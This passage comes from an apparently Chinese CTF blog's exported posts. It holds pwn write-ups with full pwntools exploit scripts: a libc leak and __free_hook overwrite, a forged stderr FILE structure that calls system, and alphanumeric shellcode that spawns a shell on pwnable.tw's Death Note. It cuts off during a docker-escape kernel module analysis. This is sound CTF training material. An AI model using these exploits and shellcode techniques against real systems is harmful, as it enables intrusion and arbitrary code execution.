= ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">    p = remote(<span class="string">"124.70.131.128"</span>,<span class="number">12032</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Game</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'$ '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        p.recvuntil(<span class="string">"----------------------\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Report</span><span class="params">(sz,content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'$ '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"BugReport: "</span>)</span><br><span class="line">    p.sendline(str(sz))</span><br><span class="line">    sleep(<span class="number">0.02</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Game()</span><br><span class="line">    p.sendline(<span class="string">'B'</span>)</span><br><span class="line">    Report(<span class="number">0x38</span>,<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'\xe8'</span>)<span class="comment">#win flag != 0</span></span><br><span class="line">    Game()</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">"C0"</span>)<span class="comment">#in case 0x202010</span></span><br><span class="line">    p.sendline(<span class="string">"D001"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"New Record! Your name: "</span>)</span><br><span class="line">    p.sendline(p64(<span class="number">0xa1</span>))</span><br><span class="line">    p.sendline(<span class="string">"A"</span>)<span class="comment">#again</span></span><br><span class="line">    <span class="comment">#malloc consolidate</span></span><br><span class="line">    Report(<span class="number">0x500</span>)</span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    Report(<span class="number">0xe0</span>,<span class="string">'a'</span>*<span class="number">0xa0</span>+<span class="string">'\x51'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'$ '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvn(<span class="number">0x43</span>)</span><br><span class="line">    heap_low = u8(p.recvn(<span class="number">1</span>)) &amp; <span class="number">0xf0</span></span><br><span class="line">    target = (heap_low &lt;&lt; <span class="number">8</span>) + <span class="number">0xa0</span></span><br><span class="line">    <span class="keyword">print</span> hex(target)</span><br><span class="line">    p.sendline(<span class="string">"A"</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil("")</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    libc_addr = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        Report(<span class="number">0xe0</span>,<span class="string">'a'</span>*<span class="number">0xa0</span>+p16(target+i))</span><br><span class="line">        p.recvuntil(<span class="string">'$ '</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.recvn(<span class="number">0x43</span>)</span><br><span class="line">        libc_addr += p.recvn(<span class="number">1</span>)</span><br><span class="line">        p.sendline(<span class="string">"A"</span>)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(libc_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    Report(<span class="number">0x38</span>,<span class="string">'a'</span>*<span class="number">0x28</span>+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    Game()</span><br><span class="line">    p.sendline(<span class="string">"C0"</span>)</span><br><span class="line">    sleep(<span class="number">0.02</span>)</span><br><span class="line">    p.sendline(<span class="string">"D110"</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"New Record! Your name: "</span>)</span><br><span class="line">    p.sendline(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    p.sendline(<span class="string">"A"</span>)<span class="comment">#again</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x0000555555554000+0xbd5')</span></span><br><span class="line">    Report(<span class="number">0x30</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="北京市网络安全宣传周技能赛"><a href="#北京市网络安全宣传周技能赛" class="headerlink" title="北京市网络安全宣传周技能赛"></a>北京市网络安全宣传周技能赛</h2><h3 id="vmpwn"><a href="#vmpwn" class="headerlink" title="vmpwn"></a>vmpwn</h3><h4 id="程序逻辑-1"><a href="#程序逻辑-1" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>模拟了一个小vm，通过指针递减+write泄露出libc。通过指针增加到stderr伪造<code>_IO_2_1_stderr_</code>，修改其vtable里+0x10处的指针，fclose时触发调用。这里有两个地方需要注意，一是参数位于<code>_flags</code>，但是后面会对其前4字节进行异或处理，这里用<code>;sh\x00</code>做注入；二是抄完stderr的值后发现有错误，跟着源码调一下到某个位置发现指定的值需要是0x20，因而下面有个值是<code>0x0000002000000002</code>，后四字节对应fd，前四字节为绕过此检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"It's an easy vm pwn."</span>);</span><br><span class="line">  sub_400796();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input the code:"</span>);</span><br><span class="line">    get_input((__int64)&amp;bss_code, <span class="number">0x400</span>);</span><br><span class="line">    Run();</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">void__int64 <span class="title">Run</span><span class="params">()</span></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *i; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;bss_code; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)*i;</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( *i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        buf = (<span class="keyword">char</span> *)buf + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">        buf = (<span class="keyword">char</span> *)buf - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">        buf = (<span class="keyword">void</span> *)(<span class="number">2L</span>L * (_QWORD)buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">        buf = (<span class="keyword">void</span> *)((<span class="keyword">signed</span> __int64)buf / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">        write(<span class="number">1</span>, buf, <span class="number">1u</span>LL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">1u</span>LL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x17</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x19</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x1A</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x1B</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x1C</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x1D</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x1E</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x1F</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x21</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">0xA</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x22</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">0xB</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x23</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">0xC</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x24</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">0xD</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x25</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">0xE</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x26</span>:</span><br><span class="line">        *(_BYTE *)buf = <span class="number">0xF</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-py-3"><a href="#exp-py-3" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    p.recvuntil(<span class="string">"input the code:\n"</span>)</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    buf_addr = <span class="number">0x6020c0</span></span><br><span class="line">    payload = <span class="string">'\x12'</span>*(buf_addr-puts_got)</span><br><span class="line">    payload += <span class="string">'\x15\x11'</span>*<span class="number">8</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">8</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    staic_libc = <span class="number">0x7ffff7a0d000</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b* 0x400c7a'</span>)</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    fake_io = flat([</span><br><span class="line">        libc_base+(<span class="number">0x00007ffff7dd25c3</span>-staic_libc),</span><br><span class="line">        libc_base+(<span class="number">0x00007ffff7dd25c3</span>-staic_libc),libc_base+(<span class="number">0x00007ffff7dd25c3</span>-staic_libc),</span><br><span class="line">        libc_base+(<span class="number">0x00007ffff7dd25c3</span>-staic_libc),libc_base+(<span class="number">0x00007ffff7dd25c3</span>-staic_libc),</span><br><span class="line">        libc_base+(<span class="number">0x00007ffff7dd25c3</span>-staic_libc),libc_base+(<span class="number">0x00007ffff7dd25c3</span>-staic_libc),</span><br><span class="line">        libc_base+(<span class="number">0x00007ffff7dd25c4</span>-staic_libc),<span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,libc_base+(<span class="number">0x00007ffff7dd2620</span>-staic_libc),</span><br><span class="line">        <span class="number">0x0000002000000002</span>,<span class="number">0xffffffffffffffff</span>,</span><br><span class="line">        <span class="number">0</span>,libc_base+(<span class="number">0x00007ffff7dd3770</span>-staic_libc),</span><br><span class="line">        <span class="number">0xffffffffffffffff</span>,<span class="number">0</span>,</span><br><span class="line">        libc_base+(<span class="number">0x00007ffff7dd1660</span>-staic_libc),<span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,libc_base+libc.sym[<span class="string">'system'</span>],</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,<span class="number">0x6020f0</span></span><br><span class="line">        ])</span><br><span class="line">    stderr = <span class="number">0x602040</span></span><br><span class="line">    payload = (stderr-puts_got<span class="number">-8</span>)*<span class="string">'\x11'</span></span><br><span class="line">    payload += <span class="string">'\x16\x11'</span>*(len(fake_io)+<span class="number">0x10</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"input the code:\n"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(p64(stderr+<span class="number">8</span>)+<span class="string">"/bin;sh\x00"</span>+fake_io)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>DDCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Death Note</title>
    <url>/2020/09/03/death_note/</url>
    <content><![CDATA[<h1 id="pwnable-tw-gt-Death-Note"><a href="#pwnable-tw-gt-Death-Note" class="headerlink" title="pwnable.tw-&gt;Death Note"></a>pwnable.tw-&gt;Death Note</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是花了两天+做出来的题，所幸这次没看别人的writeup，师姐提示了一下，昨晚肝出来的时候有种打了两天加时最后绝杀的感觉。这基本是纯考alphanumeric shellcode的题，动手看和写很重要</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序有三个功能，Add、Show和Delete。其中Add、Delete和Show都没有对Index检查，会造成越界读写，范围是比Note_addr低的地址</p>
<p><img src="/2020/09/03/death_note/1.jpg" alt="main"></p>
<p>Add可以被用来覆写got表或者plt表</p>
<p><img src="/2020/09/03/death_note/2.jpg" alt="add"></p>
<p>Show可以被用来泄露函数地址，进而得到Libc地址，这个题没有给Libc，可以考虑用DynELF或者Libcsearcher，这个后面再分析</p>
<p><img src="/2020/09/03/death_note/3.jpg" alt="show"></p>
<p>del同样没有检查index，可以把任意地址的内容作为一个chunk释放</p>
<p><img src="/2020/09/03/death_note/4.jpg" alt="del"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>开始考虑把libc版本猜出来，DynELF要求的是泄露任意地址的值，但是我们这里的Show是%s输出，并不满足其要求，对于Libcsearcher，我尝试使用read和printf和free的地址做泄露，出来的地址算出来的libc版本没有交集，不太明白这是怎么做到的，不过这条路似乎不通了。</p>
<p><img src="/2020/09/03/death_note/5.jpg" alt="addr"></p>
<p><img src="/2020/09/03/death_note/6.jpg" alt="addr2"></p>
<p>另一条路出现在Gdb调试的时候，发现heap，bss后面的权限都是rwxp，可读可写可执行，我们可以根据Index的问题在某个函数比如free的got表上malloc一个新的chunk，这个chunk的内容是shellcode，在调用free@got的时候就会去shellcode执行，注意这时候的is_printable限制输入只能使用可见字符，我们可以在<a href="https://nets.ec/Ascii_shellcode" target="_blank" rel="noopener">reference</a>去找下可以用的字符，以及这个更全的<a href="http://sparksandflames.com/files/x86InstructionChart.html" target="_blank" rel="noopener">opcode</a>结合调试写shellcode。</p>
<p><img src="/2020/09/03/death_note/7.jpg" alt="rwxp"></p>
<h3 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h3><p>我们最终的目的是构造system(“/bin//sh”,0,0)，即eax = 0xb,ebx = binsh_addr，ecx = edx = 0。int 0x80其中eax = 0可以使用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x30;</span><br><span class="line">pop eax;</span><br><span class="line">xor al,0x30;</span><br></pre></td></tr></table></figure></p>
<p>来完成，为了抬高栈(减小esp从而让之后的寻址偏移大于0x1F)</p>
<p>ebx = esp可以用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x68732f2f;</span><br><span class="line">push 0x6e69622f;</span><br><span class="line">push esp;</span><br><span class="line">pop ebx;</span><br></pre></td></tr></table></figure></p>
<p>al = 0xb可以按照刚才方法给eax清零之后inc11次<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x30;</span><br><span class="line">pop eax;</span><br><span class="line">xor al,0x30;</span><br><span class="line">inc eax;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>int 0x80可以使用edx作为跳板，开始根据偏移存储text_code地址，之后用xor把int 0x80(0xcd80)写到将要执行的最后一条指令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor edx,[ebx+0x30];</span><br><span class="line">xor [edx+0x38],di;</span><br></pre></td></tr></table></figure></p>
<p>由于全程没用ecx，所以ecx一直为0<br>xor edx,[ebx+0x30];将edx清零，之后int 0x80执行sys_ececv(“/bin/sh\x00”)</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./death_note'</span>)</span><br><span class="line">note_addr = <span class="number">0x0804a060</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./death_note'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10201</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddNote</span><span class="params">(index,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Name :'</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowNote</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    index = (address - <span class="number">0x0804a060</span>) / <span class="number">4</span></span><br><span class="line">    ShowNote(index)</span><br><span class="line">    p.recvuntil(<span class="string">'Name : '</span>)</span><br><span class="line">    data = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteNote</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Index</span><span class="params">(address)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (address-note_addr) / <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    free_got = <span class="number">0x0804A014</span></span><br><span class="line">    shellcode = asm(<span class="string">'push 0x30;pop eax;xor al, 0x30;push eax;'</span>)</span><br><span class="line">    shellcode += asm(<span class="string">'pusha'</span>)</span><br><span class="line">    shellcode += asm(<span class="string">'push 0x68732f2f;push 0x6e69622f;'</span>)</span><br><span class="line">    shellcode += asm(<span class="string">'push esp;pop ebx;'</span>)</span><br><span class="line">    shellcode += asm(<span class="string">'dec eax;xor ax,0x4f65;xor ax,0x3057;'</span>)</span><br><span class="line">    shellcode += asm(<span class="string">'push eax;pop edi;'</span>)</span><br><span class="line">    shellcode += asm(<span class="string">'push 0x30;pop eax;xor al,0x30;'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">        shellcode += asm(<span class="string">'inc eax;'</span>)</span><br><span class="line">    shellcode += asm(<span class="string">'xor edx,[ebx+0x30];'</span>)</span><br><span class="line">    shellcode += asm(<span class="string">'xor [edx+0x38],di;'</span>)</span><br><span class="line">    shellcode += asm(<span class="string">'xor edx,[ebx+0x30];'</span>)</span><br><span class="line">    <span class="comment">#shellcode += asm('inc eax;dec eax;inc eax;dec eax;')#junk</span></span><br><span class="line">    <span class="comment">#shellcode += asm('push 0x30;pop eax;xor al,0x30;push eax;inc eax;')</span></span><br><span class="line">    <span class="comment">#shellcode += asm('pop ebx;')</span></span><br><span class="line">    <span class="keyword">print</span> len(shellcode)</span><br><span class="line">    AddNote(Index(free_got),shellcode+<span class="string">'\n'</span>)</span><br><span class="line">    DeleteNote(<span class="number">-19</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
  </entry>
  <entry>
    <title>数字共测CTF docker逃逸</title>
    <url>/2019/12/12/docker_escape/</url>
    <content><![CDATA[<h1 id="数字经济共测大赛线下"><a href="#数字经济共测大赛线下" class="headerlink" title="数字经济共测大赛线下"></a>数字经济共测大赛线下</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>线下的rw自闭了两天，今天终于有空做一下docker逃逸的题目，也整理一下自己调试的思路，这是一道非常非常非常简单的题目，本来其实也用不到调试的，不过因为自己当局者迷，根本没能静下心好好研究。</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>题目给了一个虚拟机，内核版本为4.15.0-54-generic，给了一个有漏洞的内核模块de.ko，漏洞主要存在其中，初始化在bss上的hack上分配了一个堆，并用<code>*(_BYTE *)(hack1 + 8) = 1;</code>置1，之后给了cred的size大小。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">init_module</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 hack1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v2 = kmalloc_caches[<span class="number">4</span>];</span><br><span class="line">  *(&amp;note + <span class="number">0x100000000</span>LL) = <span class="number">0</span>;</span><br><span class="line">  hack1 = kmem_cache_alloc_trace(v2, <span class="number">0x14000C0</span>LL, <span class="number">10L</span>L);</span><br><span class="line">  *(_BYTE *)(hack1 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">  hack = hack1;</span><br><span class="line">  proc_create_data(<span class="string">"de"</span>, <span class="number">0x1B6</span>LL, <span class="number">0L</span>L, &amp;de_proc, <span class="number">0L</span>L);</span><br><span class="line">  printk(<span class="string">"/proc/de created\n"</span>, <span class="number">0x1B6</span>LL);</span><br><span class="line">  printk(<span class="string">"size of cred : %ld \n"</span>, <span class="number">0xA8</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>read函数将<code>*((_QWORD *)&amp;note + 1)</code>的指针的内容拷贝给用户，实际上后面可以看到在这里会分配内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">de_read</span><span class="params">(__int64 a1, __int64 user_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, user_buf);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  mutex_lock(&amp;lock);</span><br><span class="line">  printk(<span class="string">"/proc/de read\n"</span>, user_buf);</span><br><span class="line">  v4 = (<span class="keyword">unsigned</span> __int8)note;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)note &gt; v3 )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = *((_QWORD *)&amp;note + <span class="number">1</span>);</span><br><span class="line">  _check_object_size(*((_QWORD *)&amp;note + <span class="number">1</span>), v4, 